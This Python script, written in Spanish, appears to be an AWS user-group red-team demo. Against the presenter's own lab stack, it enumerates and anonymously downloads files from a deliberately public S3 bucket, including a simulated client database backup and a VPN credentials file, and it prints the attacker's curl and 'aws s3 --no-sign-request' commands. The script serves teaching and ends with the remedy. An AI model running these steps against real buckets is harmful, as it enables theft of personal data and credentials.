#!/usr/bin/env python3
"""
Paso 1 del Red Team: Exfiltracion de datos desde Bucket S3 mal configurado.
AWS User Group Minatitlan - Demo en Vivo.
"""
import sys
import shutil
import urllib.request
import json
import subprocess

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
RESET = "\033[0m"

def get_cfn_output(output_key):
    try:
        cmd = [
            "aws", "cloudformation", "describe-stacks",
            "--stack-name", "lab-red-team",
            "--query", f"Stacks[0].Outputs[?OutputKey=='{output_key}'].OutputValue",
            "--output", "text"
        ]
        res = subprocess.check_output(cmd, text=True).strip()
        return res
    except Exception:
        return None

def main():
    print(f"\n{BOLD}{CYAN}=== [RED TEAM FASE 1] Fuga de Datos en Almacenamiento S3 ==={RESET}\n")
    print(f"{YELLOW}[*] Contexto tipico en Mexico/LATAM:{RESET}")
    print("    'Subi el backup o las facturas del cliente a S3 y le quite el bloqueo")
    print("     publico para pasarselo rapido por WhatsApp o correo...'\n")

    bucket_name = get_cfn_output("ExposedS3BucketName")
    bucket_url = get_cfn_output("ExposedS3BucketURL")

    if not bucket_name or not bucket_url:
        print(f"{RED}[!] No se pudo obtener la informacion del stack 'lab-red-team'.{RESET}")
        print("    Asegurate de haber desplegado la infraestructura primero.")
        sys.exit(1)

    print(f"{GREEN}[+] Bucket objetivo detectado:{RESET} {bucket_name}")

    # Demostracion con s3scanner si esta instalado
    if shutil.which("s3scanner"):
        print(f"\n{BOLD}{CYAN}--- [HERRAMIENTA OSINT: s3scanner] ---{RESET}")
        print(f"[*] Analizando permisos y estado publico con s3scanner:")
        print(f"    $ s3scanner scan --bucket {bucket_name}")
        try:
            res = subprocess.run(["s3scanner", "scan", "--bucket", bucket_name], capture_output=True, text=True, timeout=10)
            if res.stdout:
                for line in res.stdout.strip().split("\n"):
                    print(f"    {YELLOW}>> {line}{RESET}")
        except Exception as e:
            print(f"    [!] s3scanner scan: {e}")
        print(f"{CYAN}---------------------------------------{RESET}")

    # Listar contenido del bucket sin credenciales
    print(f"\n{BOLD}{CYAN}--- PASO 1: Enumerar el bucket sin credenciales ---{RESET}")
    print(f"{YELLOW}[CMD] Cualquier persona puede correr esto en su terminal:{RESET}")
    print(f"\n    {BOLD}aws s3 ls s3://{bucket_name} --no-sign-request --recursive{RESET}\n")
    try:
        res = subprocess.run(
            ["aws", "s3", "ls", f"s3://{bucket_name}", "--no-sign-request", "--recursive"],
            capture_output=True, text=True, timeout=10
        )
        if res.stdout:
            for line in res.stdout.strip().split("\n"):
                print(f"    {YELLOW}>> {line}{RESET}")
        else:
            print(f"    {RED}[!] Sin respuesta o acceso denegado{RESET}")
    except Exception as e:
        print(f"    {RED}[!] Error: {e}{RESET}")

    print(f"\n{GREEN}[+] Probando descarga anonima (sin credenciales de AWS)...{RESET}")

    urls_a_probar = [
        ("Factura CFDI del SAT (Simulacion)", bucket_url, False,
         f"curl -s https://{bucket_name}.s3.us-east-1.amazonaws.com/facturas/factura_sat_ejemplo.xml"),
        ("Respaldo SQL con datos sensibles / CURP", f"https://{bucket_name}.s3.amazonaws.com/backups/backup_db_clientes.sql", False,
         f"curl -s https://{bucket_name}.s3.amazonaws.com/backups/backup_db_clientes.sql"),
        ("Archivo Confidencial de Credenciales VPN", f"https://{bucket_name}.s3.amazonaws.com/confidencial/credenciales_acceso.txt", False,
         f"curl -s https://{bucket_name}.s3.amazonaws.com/confidencial/credenciales_acceso.txt"),
        ("Guia Oficial de Becas AWS 2026 [PREMIO DE LA COMUNIDAD]", f"https://{bucket_name}.s3.amazonaws.com/premios/Guia_Oportunidades_Becas_AWS_2026.pdf", True,
         f"aws s3 cp s3://{bucket_name}/premios/Guia_Oportunidades_Becas_AWS_2026.pdf . --no-sign-request")
    ]

    for desc, url, is_binary, cmd_ejemplo in urls_a_probar:
        print(f"\n{BOLD}--> Intentando descargar: {desc}{RESET}")
        print(f"    URL: {url}")
        print(f"\n    {YELLOW}[CMD] Comando que usaria el atacante:{RESET}")
        print(f"    {BOLD}    {cmd_ejemplo}{RESET}\n")
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as response:
                raw_data = response.read()
                print(f"    {GREEN}[200 OK] Descarga exitosa sin autenticacion! ({len(raw_data):,} bytes){RESET}")
                content = raw_data.decode('utf-8', errors='ignore')
                print(f"    {CYAN}--- Contenido extraido (primeras lineas) ---{RESET}")
                lines = content.split('\n')[:8]
                for line in lines:
                    print(f"    {YELLOW}|{RESET} {line}")
                print(f"    {CYAN}---------------------------------------------{RESET}")
        except Exception as e:
            print(f"    {RED}[X] Error al acceder a {url}: {e}{RESET}")

    print(f"\n{BOLD}{RED}[LECCION RED TEAM]:{RESET}")
    print("Cualquier persona en Internet puede enumerar y descargar estos archivos confidenciales.")
    print("En Mexico, esto infringe la Ley Federal de Proteccion de Datos Personales (LFPDPPP).")
    print(f"\n{YELLOW}[PARA REPLICARLO EN CASA]:{RESET}")
    print(f"    aws s3 ls s3://{bucket_name} --no-sign-request --recursive")
    print(f"    curl -s https://{bucket_name}.s3.amazonaws.com/backups/backup_db_clientes.sql")
    print("La solucion inmediata es activar 'S3 Block Public Access' a nivel de cuenta u organizacion.\n")

if __name__ == "__main__":
    main()
